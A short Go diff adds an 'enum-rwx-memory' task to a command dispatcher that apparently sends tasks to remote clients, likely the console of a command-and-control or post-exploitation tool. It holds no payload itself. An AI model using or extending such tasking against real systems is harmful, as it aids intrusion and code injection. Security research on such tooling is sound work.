@@ -669,6 +669,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "enum-modules":
 		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
+	case "enum-rwx-memory":
+		PrepareTaskSimple(c, clientId, command)
 	default:
 		c.Println("Task not found.")
 	}
